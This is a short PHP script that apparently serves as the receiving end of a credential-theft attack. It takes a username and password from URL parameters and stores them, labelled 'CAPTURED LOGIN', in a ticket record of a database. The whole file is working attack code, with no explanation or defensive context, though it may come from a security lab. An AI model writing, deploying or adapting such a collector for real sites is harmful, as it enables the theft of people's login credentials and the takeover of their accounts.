<?php
require 'config/db.php';

$ticket_id = (int)($_GET['ticket_id'] ?? 0);
$u = $_GET['u'] ?? '';
$p = $_GET['p'] ?? '';

if ($ticket_id > 0) {
  $captured = "CAPTURED LOGIN -> username: $u | password: $p";
  $stmt = $pdo->prepare("UPDATE tickets SET issue = ? WHERE ticket_id = ?");
  $stmt->execute([$captured, $ticket_id]);
}
?>